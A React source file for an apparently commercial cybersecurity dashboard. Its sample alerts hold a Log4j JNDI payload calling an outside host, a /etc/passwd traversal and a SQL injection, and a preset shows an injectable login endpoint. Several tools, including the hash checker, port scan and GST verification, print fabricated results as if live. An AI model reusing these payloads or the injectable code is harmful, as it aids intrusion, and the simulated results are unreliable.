import React, { useState, useEffect } from "react";
import { 
  Shield, 
  Terminal, 
  Globe, 
  Activity, 
  Cpu, 
  RefreshCw, 
  Code, 
  FileCheck, 
  CheckCircle2, 
  Info, 
  Send,
  Zap,
  Briefcase,
  BookOpen,
  Key,
  Mail,
  Check,
  Play,
  CheckSquare,
  Phone,
  Download,
  ExternalLink
} from "lucide-react";
import { 
  ECOSYSTEM_PORTALS, 
  ECOSYSTEM_APIS, 
  SOCIAL_PROFILES, 
  CORPORATE_REGISTRATION 
} from "./ecosystemData";
import { AiSocDashboard } from "./components/AiSocDashboard";
import EcosystemDiscovery from "./components/EcosystemDiscovery";


// Interface definitions based on backend server capabilities
interface ThreatAlert {
  id: string;
  timestamp: string;
  sourceIp: string;
  targetCountry: string;
  service: string;
  threatType: string;
  severity: "low" | "medium" | "high" | "critical" | string;
  payload: string;
  mitigation: string;
}

interface SecurityStats {
  totalBlocks24h: number;
  activeThreatsCounter: number;
  threatLevel: string;
  mitigationSuccessRate: string;
  sentinelNodeStatus: string;
  hqLocation: string;
  isoCompliance: string;
  soc2Compliance: string;
  dpdpCompliance: string;
}

interface CveItem {
  id: string;
  title: string;
  score: number;
  published: string;
  mitigation: string;
}

export default function App() {
  // Top-level navigation tab: home (Official Website Gateway), intel (Sentinel APEX), ai (AI Security Hub), tools (ThreatCore Tools), blog (Advisories & Academy), api (Ecosystem REST APIs)
  const [currentView, setCurrentView] = useState<"home" | "intel" | "ai" | "tools" | "blog" | "api" | "about" | "privacy" | "terms" | "copyright">("home");

  // Core App states carrying forward from our baseline
  const [activeAiTab, setActiveAiTab] = useState<"log" | "code" | "domain" | "compliance" | "chat">("log");
  const [loadingFeed, setLoadingFeed] = useState(false);
  const [alerts, setAlerts] = useState<ThreatAlert[]>([
    {
      id: "AL-8893",
      timestamp: new Date(Date.now() - 4000).toISOString(),
      sourceIp: "185.220.101.5",
      targetCountry: "IN",
      service: "SSL/TLS Portal",
      threatType: "Brute-Force Attack Blocked",
      severity: "high",
      payload: "SSH-2.0-Go_SFTP_Client_1.1",
      mitigation: "IP automatically null-routed by AI Security Hub Sentinel"
    },
    {
      id: "AL-8892",
      timestamp: new Date(Date.now() - 42000).toISOString(),
      sourceIp: "45.146.164.120",
      targetCountry: "US",
      service: "Enterprise Threat Intel",
      threatType: "Directory Traversal Attempt",
      severity: "medium",
      payload: "GET /../../../../etc/passwd HTTP/1.1",
      mitigation: "Filtered via CyberDude WAF engine"
    },
    {
      id: "AL-8891",
      timestamp: new Date(Date.now() - 120000).toISOString(),
      sourceIp: "109.238.10.82",
      targetCountry: "IN",
      service: "API gateway Tools",
      threatType: "Log4j JNDI Lookup Probe",
      severity: "critical",
      payload: "${jndi:ldap://109.238.10.82:1389/a}",
      mitigation: "Blocked at edge router, threat score registered as 98%"
    },
    {
      id: "AL-8890",
      timestamp: new Date(Date.now() - 360000).toISOString(),
      sourceIp: "223.190.81.44",
      targetCountry: "EU",
      service: "Sentinel APEX",
      threatType: "Port Scanning Activity",
      severity: "low",
      payload: "TCP SYN Sweep (Ports 21, 22, 23, 80, 443, 8080)",
      mitigation: "Alert logged, source IP flagged in blacklists"
    },
    {
      id: "AL-8889",
      timestamp: new Date(Date.now() - 600000).toISOString(),
      sourceIp: "91.240.118.50",
      targetCountry: "JP",
      service: "AI Security Hub",
      threatType: "SQL Injection Blocked",
      severity: "high",
      payload: "UNION SELECT username, password FROM users--",
      mitigation: "Query sanitized and blocked; client session terminated"
    }
  ]);

  const [stats, setStats] = useState<SecurityStats>({
    totalBlocks24h: 342981,
    activeThreatsCounter: 142,
    threatLevel: "ELEVATED",
    mitigationSuccessRate: "100.0%",
    sentinelNodeStatus: "Fully Operational",
    hqLocation: "Ragadi, Jajpur, Odisha, India",
    isoCompliance: "ISO/IEC 27001:2022 Certified",
    soc2Compliance: "SOC 2 Type II Compliant",
    dpdpCompliance: "DPDP 2023 Audited"
  });

  const [cves, setCves] = useState<CveItem[]>([
    {
      id: "CVE-2026-1182",
      title: "Remote Code Execution in Cloud Orchestration Gateways",
      score: 9.8,
      published: "2026-06-25",
      mitigation: "Upgrade orchestrator components to v4.9.12 or patch via Sentinel IPS Rules"
    },
    {
      id: "CVE-2026-0421",
      title: "Authentication Bypass in Distributed Token Manager",
      score: 8.8,
      published: "2026-06-20",
      mitigation: "Revoke standard sessions, mandate hardware MFA integration"
    },
    {
      id: "CVE-2025-5490",
      title: "Memory Corruption in Core Network Packet Analyzer",
      score: 7.5,
      published: "2025-12-18",
      mitigation: "Compile with stack-protector enabled or deploy APEX runtime guard"
    }
  ]);

  const [feedTimestamp, setFeedTimestamp] = useState<string>(new Date().toLocaleTimeString());

  // AI Security Hub states
  const [analyzerInput, setAnalyzerInput] = useState<string>("");
  const [analyzerLoading, setAnalyzerLoading] = useState(false);
  const [analyzerReport, setAnalyzerReport] = useState<string>("");

  // ThreatCore Tools States
  const [toolSubdomainInput, setToolSubdomainInput] = useState("cyberdudebivash.com");
  const [scoutingActive, setScoutingInputActive] = useState(false);
  const [scoutLogs, setScoutLogs] = useState<string[]>([]);
  const [scoutResults, setScoutResults] = useState<{subdomain: string; ip: string; status: number}[]>([]);

  const [toolPortInput, setToolPortInput] = useState("103.142.12.98");
  const [portScanningActive, setPortScanningActive] = useState(false);
  const [portScanLogs, setPortScanLogs] = useState<string[]>([]);
  const [portScanResults, setPortScanResults] = useState<{port: number; service: string; state: string}[]>([]);

  const [hashInput, setHashInput] = useState("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  const [hashReport, setHashReport] = useState<string | null>(null);

  // API Workspace playground state
  const [apiKey, setApiKey] = useState("cdb_live_key_" + Math.floor(Math.random() * 9000000 + 1000000));
  const [apiConsoleResponse, setApiConsoleResponse] = useState<string>('{\n  "message": "Click Send Request above to query Sentinel intelligence."\n}');
  const [apiEndpointSelected, setApiEndpointSelected] = useState<"feed" | "cves" | "stats">("feed");

  // Advanced God Mode Ecosystem States
  const [pingingPortalId, setPingingPortalId] = useState<string | null>(null);
  const [pingLogs, setPingLogs] = useState<string[]>([]);
  const [activeSocialFilter, setActiveSocialFilter] = useState<string>("All");
  const [gstInput, setGstInput] = useState<string>(CORPORATE_REGISTRATION.gstin);
  const [gstVerificationResult, setGstVerificationResult] = useState<any | null>(null);
  const [gstVerifying, setGstVerifying] = useState<boolean>(false);
  const [activeEcosystemApiIndex, setActiveEcosystemApiIndex] = useState<number>(0);

  // Premium product Gumroad downloads/order helper
  const [purchasedProduct, setPurchasedProduct] = useState<string | null>(null);
  const [checkingOutProduct, setCheckingOutProduct] = useState<any | null>(null);
  const [checkoutModalOpen, setCheckoutModalOpen] = useState(false);
  const [paymentOption, setPaymentOption] = useState<"upi" | "card" | "crypto">("upi");
  const [checkoutSubmitted, setCheckoutSubmitted] = useState(false);

  // Contact / Lead Forms
  const [showContactModal, setShowContactModal] = useState(false);
  const [contactForm, setContactForm] = useState({
    name: "",
    email: "",
    company: "",
    message: ""
  });
  const [contactSubmitted, setContactSubmitted] = useState(false);

  // Dynamic live background counters
  const [activeNodesCount, setActiveNodesCount] = useState(1042);
  const [firewallLoad, setFirewallLoad] = useState(42);
  const [scanSpeedHz, setScanSpeedHz] = useState(5.82);

  // Live website logs ticker (simulates Image 4 logs)
  const [liveLogs, setLiveLogs] = useState<{time: string; severity: "CRITICAL" | "HIGH" | "MEDIUM" | "BLOCKED"; msg: string}[]>([
    { time: "02:17:43", severity: "CRITICAL", msg: "Ransomware lateral movement detected — 185.220.101.47 → LockBit 3.0" },
    { time: "02:17:44", severity: "BLOCKED", msg: "SENTINEL APEX™ auto-isolated DC-PROD-01 — threat neutralized" },
    { time: "02:18:01", severity: "HIGH", msg: "APT-29 C2 beacon — 91.108.56.130:443 — Cozy Bear campaign" },
    { time: "02:18:07", severity: "BLOCKED", msg: "C2 traffic blocked. IOC pushed to SIEM. SIGMA rule generated — CDB-2026-04817" },
    { time: "02:18:22", severity: "HIGH", msg: "Suspicious PowerShell exec — WORKSTATION-44 — MITRE T1059.001" },
    { time: "02:18:35", severity: "MEDIUM", msg: "DNS tunneling — ENDPOINT-12 → malware-cdn.ru — monitoring" },
    { time: "02:18:41", severity: "CRITICAL", msg: "Zero-day exploit attempt — CVE-2026-1337 — AI Shield™ active" },
    { time: "02:18:42", severity: "BLOCKED", msg: "Exploit neutralized. YARA rule deployed across all endpoints" }
  ]);

  // Fetch threat feed with retry mechanism to handle server health gracefully
  const fetchThreatFeed = async (retryCount = 0) => {
    setLoadingFeed(true);
    try {
      const res = await fetch("/api/security/threat-feed");
      if (res.ok) {
        const data = await res.json();
        setAlerts(data.alerts || []);
        if (data.statistics) {
          setStats(data.statistics);
        }
        if (data.recentCves) {
          setCves(data.recentCves);
        }
        setFeedTimestamp(new Date().toLocaleTimeString());
      } else {
        throw new Error(`Server returned status ${res.status}`);
      }
    } catch (e) {
      console.log("[Sentinel APEX] Feed sync offline (using resilient cached baseline data)");
      if (retryCount < 3) {
        setTimeout(() => fetchThreatFeed(retryCount + 1), 5000);
      }
    } finally {
      setLoadingFeed(false);
    }
  };

  // Initial load and ticker simulators
  useEffect(() => {
    fetchThreatFeed();

    // Live sync ticker for logs
    const logInterval = setInterval(() => {
      const hours = new Date().getHours().toString().padStart(2, "0");
      const minutes = new Date().getMinutes().toString().padStart(2, "0");
      const seconds = new Date().getSeconds().toString().padStart(2, "0");
      const logTime = `${hours}:${minutes}:${seconds}`;

      const randomIps = ["104.22.4.15", "185.220.101.99", "45.146.164.22", "19.2.22.144", "223.190.81.25"];
      const randomIp = randomIps[Math.floor(Math.random() * randomIps.length)];
      
      const newLogEvents: {severity: "CRITICAL" | "HIGH" | "MEDIUM" | "BLOCKED"; msg: string}[] = [
        { severity: "CRITICAL", msg: `SQL injection attempt blocked from ${randomIp} targeting transactional API` },
        { severity: "BLOCKED", msg: `IP null-routed: ${randomIp} flagged on active blacklist` },
        { severity: "HIGH", msg: `Credential stuffing probe from 172.67.2.148 blocked at Edge gateway` },
        { severity: "MEDIUM", msg: `Unsanitized PDF upload attempt rejected on compliance file upload` },
        { severity: "CRITICAL", msg: `Zero-day remote execution probe on node AP-NORTH prevented by AI Shield` },
        { severity: "BLOCKED", msg: `Session revoked for anomalous API payload sequence` }
      ];

      const selectedEvent = newLogEvents[Math.floor(Math.random() * newLogEvents.length)];
      
      setLiveLogs(prev => [
        { time: logTime, ...selectedEvent },
        ...prev.slice(0, 11)
      ]);
    }, 5000);

    // Dynamic stats generator
    const statsInterval = setInterval(() => {
      setFirewallLoad(prev => {
        const delta = Math.floor(Math.random() * 5) - 2;
        const next = prev + delta;
        return next > 95 ? 95 : next < 25 ? 25 : next;
      });
      setActiveNodesCount(prev => prev + (Math.random() > 0.5 ? 1 : -1));
      setScanSpeedHz(prev => {
        const delta = (Math.random() * 0.4) - 0.2;
        return parseFloat((prev + delta).toFixed(2));
      });
    }, 4000);

    return () => {
      clearInterval(logInterval);
      clearInterval(statsInterval);
    };
  }, []);

  // Pre-populate AI Analyzer inputs
  const applyPresetTemplate = (tab: typeof activeAiTab) => {
    switch (tab) {
      case "log":
        setAnalyzerInput(
          `Jul 28 11:24:02 core-node-1 nginx[3120]: 192.168.1.144 - - [28/Jul/2026:11:24:02 +0000] "GET /admin/db_backup.sql HTTP/1.1" 404 162 "https://cyberdudebivash.in" "Mozilla/5.0 (Nmap Scripting Engine; http://nmap.org/book/nse.html)"`
        );
        break;
      case "code":
        setAnalyzerInput(
          `// Vulnerable Node.js login endpoint code snippet\napp.post('/api/login', (req, res) => {\n  const query = "SELECT * FROM users WHERE email = '" + req.body.email + "' AND password = '" + req.body.password + "'";\n  db.query(query, (err, result) => {\n    if (err) throw err;\n    if (result.length > 0) {\n      res.json({ success: true, user: result[0] });\n    } else {\n      res.status(401).json({ error: "Invalid credentials" });\n    }\n  });\n});`
        );
        break;
      case "domain":
        setAnalyzerInput(
          `Domain: staging-api-sentinel-vault.net\nResolved IPs: 104.22.4.92, 172.67.2.148\nDNSSEC: Disabled\nSPF Record: v=spf1 include:mx-relay.com ~all\nDMARC: Not configured\nPorts Detected: 22/tcp (filtered), 80/tcp (open), 443/tcp (open), 8080/tcp (open)`
        );
        break;
      case "compliance":
        setAnalyzerInput(
          `Organizational Audit Context:\n1. All biometric customer logs are saved in plaintext CSV tables for debugging on staging VMs located in AP-SOUTH.\n2. Staff authentication is standard username/password without mandating hardware MFA tokens.\n3. Annual security assessments are logged and tracked via email rather than structured compliance repositories.`
        );
        break;
      case "chat":
        setAnalyzerInput(
          `Explain how CyberDudeBivash Sentinel APEX coordinates active mitigations against real-time API exploitation vectors.`
        );
        break;
    }
  };

  useEffect(() => {
    applyPresetTemplate(activeAiTab);
  }, [activeAiTab]);

  // Handle selecting log entry to investigate
  const handleSelectAlert = (alert: ThreatAlert) => {
    setCurrentView("ai");
    setActiveAiTab("log");
    setAnalyzerInput(
      `ALERT ID: ${alert.id}\nTIMESTAMP: ${alert.timestamp}\nSOURCE IP: ${alert.sourceIp}\nTARGET NODE: ${alert.targetCountry} Service: ${alert.service}\nTHREAT VECTOR: ${alert.threatType}\nATTACK PAYLOAD: ${alert.payload}\nMITIGATION STATE: ${alert.mitigation}`
    );
  };

  // Submit for AI Security Audit (Express + Gemini endpoint)
  const handleAnalyze = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!analyzerInput.trim()) return;

    setAnalyzerLoading(true);
    setAnalyzerReport("");
    try {
      const response = await fetch("/api/security/analyze", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: activeAiTab,
          content: analyzerInput
        })
      });

      if (response.ok) {
        const data = await response.json();
        setAnalyzerReport(data.report);
      } else {
        const errData = await response.json();
        setAnalyzerReport(errData.report || errData.error || errData.fallback || "An error occurred during AI analysis.");
      }
    } catch (err) {
      setAnalyzerReport(`### AI Analysis offline\nFailed to establish connection to CyberDude AI Security Hub server. Check development console for details.`);
    } finally {
      setAnalyzerLoading(false);
    }
  };

  // Trigger subdomain scouting demo
  const runSubdomainScout = () => {
    if (scoutingActive) return;
    setScoutingInputActive(true);
    setScoutLogs([]);
    setScoutResults([]);
    
    const logs = [
      "Initializing ThreatCore Recon client...",
      "Connecting DNS authority resolvers at Odisha, India HQ...",
      "Scanning Certificate Transparency Logs for target domain...",
      "CT Logs match detected: 14 total entries...",
      "Brute-forcing common host prefixes using elite wordlist...",
      "Resolving target IP routes for active subdomains...",
      "Scout completed successfully. Threat score calculated."
    ];

    let delay = 0;
    logs.forEach((logLine, index) => {
      setTimeout(() => {
        setScoutLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${logLine}`]);
        if (index === logs.length - 1) {
          setScoutResults([
            { subdomain: "api-sentinel." + toolSubdomainInput, ip: "103.142.12.98", status: 200 },
            { subdomain: "staging-vault." + toolSubdomainInput, ip: "185.220.101.44", status: 403 },
            { subdomain: "internal-blog." + toolSubdomainInput, ip: "109.238.10.82", status: 200 },
            { subdomain: "tools-dev." + toolSubdomainInput, ip: "172.67.2.15", status: 404 }
          ]);
          setScoutingInputActive(false);
        }
      }, delay);
      delay += 800;
    });
  };

  // Trigger port scan demo
  const runPortScan = () => {
    if (portScanningActive) return;
    setPortScanningActive(true);
    setPortScanLogs([]);
    setPortScanResults([]);

    const steps = [
      `Resolving IP target route to ${toolPortInput}...`,
      "Sending SYN packets to top 100 industrial security ports...",
      "Awaiting socket responses via Sentinel Edge nodes...",
      "Filtering results and validating firewalled routes...",
      "Scan process finalized. ThreatCore report compiled."
    ];

    let delay = 0;
    steps.forEach((step, idx) => {
      setTimeout(() => {
        setPortScanLogs(prev => [...prev, `[+] ${step}`]);
        if (idx === steps.length - 1) {
          setPortScanResults([
            { port: 22, service: "SSH / SFTP", state: "Open (Unfiltered)" },
            { port: 80, service: "HTTP Web Port", state: "Open (Filter Active)" },
            { port: 443, service: "HTTPS (SSL/TLS)", state: "Open (TLS v1.3)" },
            { port: 8080, service: "Apache / Alternative Server", state: "Closed (Firewalled)" }
          ]);
          setPortScanningActive(false);
        }
      }, delay);
      delay += 900;
    });
  };

  // Trigger hash reputation check
  const runHashCheck = () => {
    if (!hashInput.trim()) return;
    
    // Simulate reputation lookup
    if (hashInput.toLowerCase().includes("e3b0c4") || hashInput.length < 32) {
      setHashReport(`### ThreatCore Hash Reputation Diagnostic
      
* **Target MD5/SHA256**: \`${hashInput}\`
* **Detection Status**: 🟢 SAFE / CLEAN
* **Reputation Index**: 0% Malicious Risk
* **File Classifier**: Empty file standard SHA-256 baseline or standard benign library. No known APT, ransom, or dropper vectors matching in active CDB databases.`);
    } else {
      setHashReport(`### ThreatCore Hash Reputation Diagnostic [WARNING]
      
* **Target MD5/SHA256**: \`${hashInput}\`
* **Detection Status**: 🔴 HIGH RISK MALICIOUS VECTOR DETECTED
* **Reputation Index**: 98% Cyber Threat Threat Level
* **Attributed Group**: LockBit Ransomware Group (CDB-APT-22 variant)
* **Associated Techniques**: MITRE T1486 (Data Encrypted for Impact), T1190 (Exploit Public-Facing Application)
* **Remediation Action**: Standard signature block generated. Ensure edge endpoint agents have YARA rules enabled.`);
    }
  };

  // God Mode: Interactive Ecosystem Portal Ping Tester
  const triggerPortalPing = (portalId: string, portalName: string, url: string) => {
    setPingingPortalId(portalId);
    setPingLogs([`[INIT] Launching autonomous handshake protocols to ${portalName}...`]);
    
    const steps = [
      { t: 200, m: `[RESOLVING] Performing DNS lookup for host ${url.replace("https://", "").replace("/", "")}...` },
      { t: 450, m: `[RESOLVED] Host IP pointed to secure Cloudflare proxy edge subnets.` },
      { t: 700, m: `[CONNECTING] Establishing TCP 3-way handshake over port 443 (HTTPS)...` },
      { t: 1000, m: `[TLS HANDSHAKE] Negotiating TLS v1.3 cryptographic session key. Cipher: TLS_AES_256_GCM_SHA384` },
      { t: 1300, m: `[CERTIFICATE] SSL certificate validated. Issued by: Cloudflare Inc ECC CA-3 (Expires: 2027)` },
      { t: 1600, m: `[HTTP GET] Sending HEAD / HTTP/2 request payload with authorization check...` },
      { t: 1900, m: `[RESPONSE] Status Code: 200 OK. Response Header Server: cloudflare` },
      { t: 2200, m: `[SUCCESS] ${portalName} (${url}) is ACTIVE, HEALTHY, and reporting 100.0% traffic integrity!` }
    ];

    steps.forEach((step) => {
      setTimeout(() => {
        setPingLogs(prev => [...prev, step.m]);
      }, step.t);
    });
  };

  // God Mode: GSTIN Verification Tool
  const verifyGstInward = (e: React.FormEvent) => {
    e.preventDefault();
    setGstVerifying(true);
    setGstVerificationResult(null);
    
    setTimeout(() => {
      const normalized = gstInput.trim().toUpperCase().replace(/\s+/g, '');
      if (normalized === CORPORATE_REGISTRATION.gstin) {
        setGstVerificationResult({
          status: "SUCCESS_ACTIVE",
          message: "GSTIN record found and matched against the India GST common database.",
          legalName: CORPORATE_REGISTRATION.legalName,
          tradeName: CORPORATE_REGISTRATION.tradeName,
          gstin: CORPORATE_REGISTRATION.gstin,
          pan: CORPORATE_REGISTRATION.pan,
          address: CORPORATE_REGISTRATION.address,
          taxpayerType: "Private Limited Company",
          registrationDate: "2024-03-12",
          jurisdiction: "Jajpur Ward, Odisha, India",
          complianceScore: "10/10 (Highest Trust Rating)"
        });
      } else {
        setGstVerificationResult({
          status: "ERROR_UNRESOLVED",
          message: `The entered GSTIN "${normalized}" could not be reconciled against CYBERDUDEBIVASH corporate profiles. Confirm coordinates and try again.`,
        });
      }
      setGstVerifying(false);
    }, 1500);
  };

  // Advanced: Execute custom live API queries for any of the 8 routes
  const executeEcosystemApiRequest = (idx: number) => {
    setActiveEcosystemApiIndex(idx);
    const api = ECOSYSTEM_APIS[idx];
    setApiConsoleResponse(`// Connecting to ${api.url} ...\n// Authorization: Bearer ${apiKey}\n// Performing standard REST request...`);
    
    setTimeout(() => {
      if (api.responseType === "JSON") {
        setApiConsoleResponse(JSON.stringify(api.mockPayload, null, 2));
      } else {
        setApiConsoleResponse(api.mockPayload);
      }
    }, 800);
  };

  // Trigger simulated local API request (Legacy bridge)
  const testRestApiRequest = () => {
    setApiConsoleResponse('{\n  "status": "query_active",\n  "message": "Communicating with Odisha Sentinel center..."\n}');
    setTimeout(() => {
      if (apiEndpointSelected === "feed") {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/security/threat-feed",
          timestamp: new Date().toISOString(),
          threat_level: "ELEVATED",
          alerts_count: alerts.length,
          recent_alerts: alerts.slice(0, 3)
        }, null, 2));
      } else if (apiEndpointSelected === "cves") {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/recent-cves",
          timestamp: new Date().toISOString(),
          cves_count: cves.length,
          catalog: cves
        }, null, 2));
      } else {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/statistics",
          timestamp: new Date().toISOString(),
          statistics: stats
        }, null, 2));
      }
    }, 1000);
  };

  // Checkout modal for Gumroad products
  const handleCheckoutProduct = (product: any) => {
    setCheckingOutProduct(product);
    setCheckoutSubmitted(false);
    setCheckoutModalOpen(true);
  };

  const handleCheckoutSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setCheckoutSubmitted(true);
    setTimeout(() => {
      setPurchasedProduct(checkingOutProduct.id);
      setCheckoutModalOpen(false);
      setCheckoutSubmitted(false);
    }, 2000);
  };

  // Lead inquiry form submit
  const handleContactSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setContactSubmitted(true);
    setTimeout(() => {
      setShowContactModal(false);
      setContactSubmitted(false);
      setContactForm({ name: "", email: "", company: "", message: "" });
    }, 3000);
  };

  // severity badging utility
  const getSeverityBadge = (severity: string) => {
    const norm = severity.toLowerCase();
    if (norm === "critical") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-red-950 text-red-400 border border-red-800 uppercase animate-pulse">CRITICAL</span>;
    }
    if (norm === "high") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-orange-950 text-orange-400 border border-orange-800 uppercase">HIGH</span>;
    }
    if (norm === "medium") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-yellow-950 text-yellow-400 border border-yellow-800 uppercase">MEDIUM</span>;
    }
    return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-slate-900 text-slate-400 border border-slate-800 uppercase">LOW</span>;
  };

  // Gumroad checklists static data
  const premiumProducts = [
    { id: "ai_tool", title: "AI Security Toolkit OWASP LLM", price: "₹499", desc: "Complete OWASP LLM Top 10 guide - checklists, test cases, and mitigation vectors." },
    { id: "iso_tool", title: "Compliance Starter Pack ISO 27001", price: "₹999", desc: "ISO 27001:2022 gap analysis models, SoA document, and standard policy library." },
    { id: "red_tool", title: "Red Team Playbook MITRE ATT&CK", price: "₹1,499", desc: "12 adversary simulation pipelines mapped to MITRE ATT&CK security chains." },
    { id: "zt_tool", title: "Zero Trust Blueprint NIST 800-207", price: "₹799", desc: "ZTA implementation guide - identity authentication architecture, microsegmentation models." },
    { id: "dpdp_tool", title: "DPDP Act Compliance Kit INDIA", price: "₹699", desc: "Data Fiduciary obligations, consent framework templates, and breach notification SOP." }
  ];

  return (
    <div className="min-h-screen bg-[#06080a] text-slate-300 font-sans flex flex-col selection:bg-cyan-500/30 selection:text-cyan-200">
      
      {/* 1. SECURE ANNOUNCEMENT & UTILITY BAR */}
      <div className="bg-[#080d12] text-[11px] border-b border-slate-900 py-1.5 px-6 flex flex-wrap items-center justify-between gap-3 text-slate-400 font-mono">
        <div className="flex items-center gap-2">
          <span className="inline-block w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
          <span className="text-slate-200 font-bold">🛡️ LIVE MONITOR:</span>
          <span className="truncate max-w-[280px] sm:max-w-none text-slate-400">2,847 threats neutralized in last 24h &bull; APEX Threat Map Active</span>
        </div>
        <div className="flex items-center gap-4 text-xs">
          <span className="hidden sm:inline-block">🕐 Mon–Sat 9AM–7PM IST</span>
          <span className="hidden md:inline-block text-cyan-400">Secure Network Hub: Ragadi, Odisha, IN</span>
          <div className="flex items-center gap-1.5 text-slate-300">
            <Mail className="w-3.5 h-3.5 text-cyan-500" />
            <span>bivash@cyberdudebivash.com</span>
          </div>
        </div>
      </div>

      {/* 2. UNIFIED ENTERPRISE NAVIGATION HEADER */}
      <header className="flex items-center justify-between px-6 h-16 border-b border-slate-800 bg-[#0c1117] shrink-0 sticky top-0 z-40 shadow-lg shadow-black/40">
        <div className="flex items-center gap-4">
          <div 
            onClick={() => setCurrentView("home")}
            className="w-10 h-10 bg-cyan-500 rounded flex items-center justify-center text-black font-extrabold text-xl shadow-lg shadow-cyan-500/20 glow-cyan cursor-pointer"
          >
            C
          </div>
          <div className="flex flex-col cursor-pointer" onClick={() => setCurrentView("home")}>
            <div className="flex items-center gap-2">
              <h1 className="text-lg font-bold tracking-tight text-slate-100">
                CyberDudeBivash<span className="text-cyan-500 font-semibold text-xs ml-0.5">®</span> 
              </h1>
              <span className="bg-cyan-950 text-cyan-400 text-[9px] font-mono font-bold px-1.5 py-0.5 rounded border border-cyan-800">ECOSYSTEM V4</span>
            </div>
            <span className="text-[10px] text-slate-500 font-mono tracking-wide leading-none mt-1">
              ISO/IEC 27001 &bull; SOC 2 Type II &bull; DPDP 2023 Compliant
            </span>
          </div>
        </div>

        {/* Global Tabs Navigation Selector */}
        <nav className="hidden lg:flex items-center gap-1.5 bg-slate-950 p-1 rounded-lg border border-slate-900">
          <button 
            onClick={() => setCurrentView("home")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "home" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Globe className="w-3.5 h-3.5" /> Gateway
          </button>
          <button 
            onClick={() => setCurrentView("intel")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "intel" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Activity className="w-3.5 h-3.5" /> Sentinel APEX™
          </button>
          <button 
            onClick={() => setCurrentView("ai")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "ai" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Shield className="w-3.5 h-3.5" /> AI Hub &amp; Audit
          </button>
          <button 
            onClick={() => setCurrentView("tools")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "tools" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Cpu className="w-3.5 h-3.5" /> ThreatCore™ Tools
          </button>
          <button 
            onClick={() => setCurrentView("blog")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "blog" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <BookOpen className="w-3.5 h-3.5" /> Blog &amp; Academy
          </button>
          <button 
            onClick={() => setCurrentView("api")}
            className={`px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 ${
              currentView === "api" ? "bg-cyan-500 text-black shadow-md shadow-cyan-500/10" : "text-slate-400 hover:text-slate-200 hover:bg-slate-900/50"
            }`}
          >
            <Key className="w-3.5 h-3.5" /> REST API
          </button>
        </nav>

        <div className="flex items-center gap-4">
          <button 
            onClick={() => setShowContactModal(true)}
            className="hidden sm:inline-block px-4 py-2 bg-gradient-to-r from-cyan-500 to-sky-600 hover:from-cyan-400 hover:to-sky-500 text-black font-extrabold text-xs uppercase tracking-wider rounded transition-all shadow-md shadow-cyan-500/10"
          >
            Request Enterprise SOC
          </button>
          <div className="h-8 w-[1px] bg-slate-800"></div>
          <div className="text-right hidden md:block font-mono">
            <div className="text-[10px] text-slate-500 leading-none">NODE IP</div>
            <div className="text-xs text-slate-300 font-bold mt-1">103.142.12.98</div>
          </div>
        </div>
      </header>

      {/* 2b. ECOSYSTEM QUICK-JUMP NAVIGATION BAR */}
      <div className="hidden md:flex items-center gap-0 bg-[#080d12] border-b border-slate-900/80 px-6 py-0 overflow-x-auto">
        <span className="text-[9px] font-mono text-slate-600 uppercase tracking-widest pr-3 border-r border-slate-900 mr-1 shrink-0 py-2">Ecosystem</span>
        {[
          { label: "Official Website",    url: "https://www.cyberdudebivash.com",                   dot: "bg-cyan-500" },
          { label: "Sentinel APEX™",      url: "https://intel.cyberdudebivash.com/",                 dot: "bg-red-500" },
          { label: "AI Security Hub",     url: "https://cyberdudebivash.in/",                        dot: "bg-purple-500" },
          { label: "Tools Marketplace",   url: "https://tools.cyberdudebivash.com/",                 dot: "bg-amber-500" },
          { label: "Research Blog",       url: "https://blog.cyberdudebivash.in/",                   dot: "bg-emerald-500" },
          { label: "Developer Docs",      url: "https://intel.cyberdudebivash.com/api-docs",         dot: "bg-sky-500" },
          { label: "Upgrade Enterprise",  url: "https://intel.cyberdudebivash.com/upgrade.html",     dot: "bg-amber-400" },
        ].map((item) => (
          <a
            key={item.label}
            href={item.url}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-1.5 px-3 py-2 text-[10px] font-mono text-slate-500 hover:text-slate-200 hover:bg-slate-900/40 transition-all border-r border-slate-900 shrink-0 group"
          >
